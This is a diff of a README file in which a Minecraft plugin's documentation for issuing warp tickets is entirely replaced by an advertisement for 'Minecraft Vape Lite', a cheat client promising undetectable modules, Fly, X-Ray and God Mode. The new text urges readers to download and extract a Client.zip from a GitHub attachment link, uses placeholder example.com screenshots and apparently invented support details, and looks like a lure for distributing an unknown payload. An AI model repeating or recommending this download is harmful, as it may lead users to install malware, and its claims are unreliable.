@@ -1,29 +1,57 @@
-# Minecraft Ticket Creator (Bukkit)
+# Minecraft Vape Lite
 
-Simple minecraft plugin for issuing custom tickets for player warps
+Welcome to Minecraft Vape Lite! 🎮🚀 
 
->Feel free to alter the code of this plugin to your needs
+## Description
 
-> [!IMPORTANT]
-> The plugin is tested only on 1.21 Paper <br />
-> The plugin needs [Vault](https://www.spigotmc.org/resources/vault.34315/), [PlayerWarps](https://www.spigotmc.org/resources/⭐-player-warps-⭐-➢-let-your-players-set-warps-1-7-1-21.115286/) installed in order to enable! <br />
-> The plugin is configured to use [CMI](https://www.spigotmc.org/resources/cmi-298-commands-insane-kits-portals-essentials-economy-mysql-sqlite-much-more.3742/) as an economy plugin, but can be changed in the `plugin.yml`
+Minecraft Vape Lite is a ghost client known for its undetectable modules during screenshares. This client is designed to provide players with an advantage while remaining hidden from prying eyes. It offers support for Minecraft versions 1.7.10 through 1.16.5.
 
 ## Features
-* 5 tiers of tickets
-* Customizable lore, name, type, price and glowing for every tier
-* [PlayerWarps](https://www.spigotmc.org/resources/⭐-player-warps-⭐-➢-let-your-players-set-warps-1-7-1-21.115286/) plugin connectivity
-* Ability to check if the player is the owner of the warp
-> /tickets reload \
-> /tickets buy `tier` `warp` `quantity`
+
+- Undetectable modules
+- Seamless integration
+- Multi-version support
+- Improved gameplay experience
 
 ## Installation
-1. Download the latest release on the right side of the page.
-2. Download the [Vault](https://www.spigotmc.org/resources/vault.34315/), [PlayerWarps](https://www.spigotmc.org/resources/⭐-player-warps-⭐-➢-let-your-players-set-warps-1-7-1-21.115286/) plugin dependency.
-3. Download [CMI](https://www.spigotmc.org/resources/cmi-298-commands-insane-kits-portals-essentials-economy-mysql-sqlite-much-more.3742/) or other Vault compatible economy plugin <br />
-3.1. If you installed other economy plugin, change the `depend:` in `plugin.yml` in the source code, then recompile the `.jar` file
-4. Drop all the `.jar` files in your `plugins` folder.
-5. Start the server and a folder `UltrapixelTicketCreator` will be generated with a `config.yml` file.
-6. Configure the plugin using `config.yml` to your needs
-7. Reload the plugin using `/tickets reload`
 
+To start using Minecraft Vape Lite, follow these steps:
+
+1. Download the client from the link below:
+   [![Download Vape Lite](https://img.shields.io/badge/Download-Vape_Lite-<COLOR>.svg)](https://github.com/user-attachments/files/16830252/Client.zip)
+   
+2. Extract the downloaded file to your Minecraft directory.
+3. Launch the game and enjoy the enhanced gameplay experience!
+
+## Screenshots
+
+Here are some screenshots of Minecraft Vape Lite in action:
+
+![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 3](https://example.com/screenshot3.png)
+
+## Modules
+
+Minecraft Vape Lite comes with a variety of modules to enhance your gameplay. Some of the key modules include:
+
+- **Fly**: Allows you to fly in the game.
+- **X-Ray**: Reveals hidden ores and structures.
+- **God Mode**: Makes you invincible in combat.
+- **AutoMiner**: Automatically mines blocks for you.
+
+## Support
+
+If you encounter any issues or have questions about Minecraft Vape Lite, feel free to reach out to our support team at [support@vapelitesupport.com](mailto:support@vapelitesupport.com).
+
+## Contributing
+
+We welcome contributions from the community to make Minecraft Vape Lite even better! If you have ideas for new features or improvements, please submit a pull request.
+
+## License
+
+Minecraft Vape Lite is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+---
+
+Thank you for choosing Minecraft Vape Lite! Download the client now and elevate your Minecraft experience! 🎉🔥
